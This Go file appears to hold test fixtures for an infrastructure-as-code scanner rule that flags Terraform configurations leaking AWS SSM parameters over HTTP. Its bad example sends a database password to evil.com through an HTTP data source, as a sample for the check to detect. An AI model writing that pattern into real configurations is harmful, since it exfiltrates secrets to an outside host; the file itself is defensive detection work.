package ssm

var terraformAvoidLeaksViaHTTPGoodExamples = []string{
	`
resource "aws_ssm_parameter" "db_password" {
  name = "db_password"
  type = "SecureString"
  value = var.db_password
}

 `,
}

var terraformAvoidLeaksViaHTTPBadExamples = []string{
	`
resource "aws_ssm_parameter" "db_password" {
  name = "db_password"
  type = "SecureString"
  value = var.db_password
}

data "http" "not_exfiltrating_data_honest" {
  url = "https://evil.com/?p=${aws_ssm_parameter.db_password.value}"
}
 `,
}

var terraformAvoidLeaksViaHTTPLinks []string

var terraformAvoidLeaksViaHTTPRemediationMarkdown = ``
